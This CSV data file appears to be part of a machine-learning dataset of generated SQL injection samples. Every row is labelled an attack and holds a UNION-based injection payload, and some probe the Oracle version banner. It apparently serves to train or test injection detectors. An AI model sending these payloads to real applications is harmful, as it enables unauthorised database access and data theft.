id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000196,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000273,5.486376925467556
GAN_000197,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,4.227823666739983
GAN_000198,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001586,5.405972259455137
GAN_000199,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,5.776649638813663
GAN_000200,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,10.157599271564811
GAN_000201,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,4.345916742310745
GAN_000202,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,4.692604361735029
GAN_000203,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000886,6.961870707274203
GAN_000204,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.335842959440847
GAN_000205,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.553008749078696
GAN_000206,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000327,4.012690106382915
GAN_000207,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,4.891495597746819
GAN_000208,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001120,5.1127272182132515
GAN_000209,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,4.608442665944188
GAN_000210,attack,union,"1'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000626,4.559282447975112
GAN_000211,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000273,3.971897751838231
GAN_000212,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,4.683334022825095
GAN_000213,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001586,4.3435585779793
GAN_000214,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,7.2149510333692435
GAN_000215,attack,union,"-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--",nearest_attack_euclidean,R001494,5.090065766748836
GAN_000216,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001620,3.9827675533930558
GAN_000217,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.36308439322969
GAN_000218,attack,union,"-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--",nearest_attack_euclidean,R001494,5.884842263920665
GAN_000219,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,5.20797663905626
GAN_000220,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,3.7763399146449252
GAN_000221,attack,union,"-7069  )   union all select 6638,6638,6638,6638,6638,6638--",nearest_attack_euclidean,R000788,3.695536801799609
GAN_000222,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001620,3.822460268819302
GAN_000223,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,5.641954288160681
GAN_000224,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,4.0932824533598895
GAN_000225,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.942555045461726
GAN_000226,attack,union,"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",nearest_attack_euclidean,R000814,7.12644928782029
GAN_000227,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,3.8579020790552376
GAN_000228,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,5.651712040005043
GAN_000229,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,5.206017467009747
GAN_000230,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,6.429791836498435
GAN_000231,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,6.312809871203317
GAN_000232,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001256,3.5871742673240057
GAN_000233,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,4.588725488959686
GAN_000234,attack,union,"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",nearest_attack_euclidean,R000982,4.39087739611335
GAN_000235,attack,union,"1'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000626,4.654835940783116
GAN_000236,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001141,4.706257045523545
GAN_000237,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000988,5.110254921284854
GAN_000238,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R001352,5.492053320063733
GAN_000239,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.3156002774608986
GAN_000240,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001586,4.116235855800637
GAN_000241,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001141,5.326697392904824
GAN_000242,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,3.8068812588888377
GAN_000243,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,6.023118634079895
GAN_000244,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,7.086078550332051
GAN_000245,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,4.956585824602821
GAN_000246,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,5.32289337095628
GAN_000247,attack,union,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000207,6.34664604033711
GAN_000248,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.115679511888281
GAN_000249,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,4.288536709886825
GAN_000250,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000791,3.7197350440658266
GAN_000251,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,3.904603561808095
GAN_000252,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,5.324062787092808
GAN_000253,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,4.079998997645833
GAN_000254,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,7.216452684758853
GAN_000255,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,3.4205949162629676
GAN_000256,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,3.8459074952851533
GAN_000257,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,4.589189175845764
GAN_000258,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001141,5.110448000472843
GAN_000259,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,4.793016795525585
GAN_000260,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,6.619788848068612
GAN_000261,attack,union,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000207,4.595797311714696
GAN_000262,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,5.018795663792362
GAN_000263,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,4.418423434850222
GAN_000264,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000327,4.662855484509531
GAN_000265,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,4.642755909153847
GAN_000266,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.774558796211212
GAN_000267,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,7.494329783286945
GAN_000268,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,4.932786929021661
GAN_000269,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,4.476072810913837
GAN_000270,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,3.835163419624922
GAN_000271,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000328,3.989415720985297
GAN_000272,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,3.6844693939630133
GAN_000273,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.12259205183863
GAN_000274,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.979493888210373
GAN_000275,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,4.600389574545864
GAN_000276,attack,union,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",nearest_attack_euclidean,R001093,4.021160562162618
GAN_000277,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000986,4.2984602733005275
GAN_000278,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.7577607024965904
GAN_000279,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R001405,12.610125053230254
GAN_000280,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.988487974705304
GAN_000281,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,6.826540988139817
GAN_000282,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000886,4.827411032645585
GAN_000283,attack,union,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000207,4.6481137838311275
GAN_000284,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,5.35822776237539
GAN_000285,attack,union,"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",nearest_attack_euclidean,R000814,7.904702584856919
GAN_000286,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001141,4.128712322138797
GAN_000287,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001407,4.983109272512096
GAN_000288,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,9.461148749825107
GAN_000289,attack,union,"-7069  )   union all select 6638,6638,6638,6638,6638,6638--",nearest_attack_euclidean,R000788,3.295823545040675
GAN_000290,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R001018,4.987496948168512
GAN_000291,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,5.215535795384565
GAN_000292,attack,union,"-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#",nearest_attack_euclidean,R000930,5.059249184567732
GAN_000293,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,5.5839718788104715
GAN_000294,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000886,4.841095116341927
GAN_000295,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,4.285481853416899
GAN_000296,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,3.3430941352057677
GAN_000297,attack,union,"-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#",nearest_attack_euclidean,R000930,5.311360457581724
GAN_000298,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001141,4.31728837239446
GAN_000299,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,4.724175574950227
GAN_000300,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,4.231375880094695
GAN_000301,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,4.355011691922314
GAN_000302,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,7.181788207485646
GAN_000303,attack,union,"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",nearest_attack_euclidean,R000814,5.9211488251338755
GAN_000304,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R001018,4.007362863494939
GAN_000305,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,4.793283971749677
GAN_000306,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.786580972281699
GAN_000307,attack,union,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",nearest_attack_euclidean,R001093,4.427739686967681
GAN_000308,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,4.899887990923141
GAN_000309,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,4.670148323868972
GAN_000310,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,3.7202788029150002
GAN_000311,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,7.257219240968475
GAN_000312,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,6.076379489018413
GAN_000313,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000986,3.7809642723554653
GAN_000314,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000327,3.919633131814956
GAN_000315,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,3.5677851157011085
GAN_000316,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000327,4.570499550080923
GAN_000317,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001620,3.22451020538066
GAN_000318,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,9.747902766390743
GAN_000319,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000727,13.330931097507175
GAN_000320,attack,union,"1'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000626,5.90307625047198
GAN_000321,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.8371767589830315
GAN_000322,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,4.502521457207386
GAN_000323,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,4.169995071268076
GAN_000324,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.381308423978944
GAN_000325,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,5.23707051127394
GAN_000326,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,4.158806305993241
GAN_000327,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,3.763794548004451
GAN_000328,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R001405,12.246721674250805
GAN_000329,attack,union,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",nearest_attack_euclidean,R001093,3.4224549093283994
GAN_000330,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,4.759562267154036
GAN_000331,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001586,3.8900778201414274
GAN_000332,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,4.34900382631871
GAN_000333,attack,union,"-3725'   )    )    union all select 1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000582,3.8946173903942936
GAN_000334,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.23090233508761
GAN_000335,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,8.475120327058537
GAN_000336,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001620,3.6864707639300134
GAN_000337,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.704505446038772
GAN_000338,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,6.21187574155327
GAN_000339,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,4.650359042369154
GAN_000340,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,4.509173237166788
GAN_000341,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,4.162085253405997
GAN_000342,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,5.991462899483415
GAN_000343,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.7861973413772145
GAN_000344,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,3.833079155501651
GAN_000345,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,4.0632067772901586
GAN_000346,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,4.416677750030172
GAN_000347,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,7.937445325052872
GAN_000348,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,10.67138682071509
GAN_000349,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R001405,8.360134524298688
GAN_000350,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,10.180367397822195
GAN_000351,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001120,5.569847485879228
GAN_000352,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,4.661317847283828
GAN_000353,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,7.118687932399183
GAN_000354,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,4.996983415497981
GAN_000355,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R001405,12.838612526034243
GAN_000356,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.782170491730856
GAN_000357,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000791,4.602554164206381
GAN_000358,attack,union,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",nearest_attack_euclidean,R001093,3.7384260059388428
GAN_000359,attack,union,"-3725'   )    )    union all select 1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000582,4.9486135601549295
GAN_000360,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000327,3.45594271404068
GAN_000361,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,3.8419812198810965
GAN_000362,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,4.884448495617848
GAN_000363,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000986,5.183904381391814
GAN_000364,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000886,6.1656988851248
GAN_000365,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,3.744780034252436
GAN_000366,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,5.781301180495592
GAN_000367,attack,union,"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",nearest_attack_euclidean,R000982,3.837364903056596
GAN_000368,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,5.3213552454547255
GAN_000369,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,7.516285886219863
GAN_000370,attack,union,"1'+  (  select ugvj where 2593  =  2593 union all select null,null,null,null,null#",nearest_attack_euclidean,R000963,6.06689128383192
GAN_000371,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,4.826121845417374
GAN_000372,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.488326092552104
GAN_000373,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,4.268938265263573
GAN_000374,attack,union,"1'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000626,5.0257853537268
GAN_000375,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,5.27597035448322
GAN_000376,attack,union,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",nearest_attack_euclidean,R001093,3.851241775666133
GAN_000377,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,9.594890168698194
GAN_000378,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001586,4.505604306527344
GAN_000379,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000886,5.231313182361288
GAN_000380,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,5.686944918240072
GAN_000381,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,5.658107508477402
GAN_000382,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000010,9.754358437140606
GAN_000383,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,7.380811347932823
GAN_000384,attack,union,"1%'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R001262,5.023636891935144
GAN_000385,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000886,5.596108065366879
GAN_000386,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.416657098560648
GAN_000387,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.775704547444151
GAN_000388,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,4.618292591725452
GAN_000389,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,5.299861153992369
GAN_000390,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,6.339739940633586
GAN_000391,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000988,4.361990379445814
GAN_000392,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R001329,9.219660799484986
GAN_000393,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000010,11.404714796572351
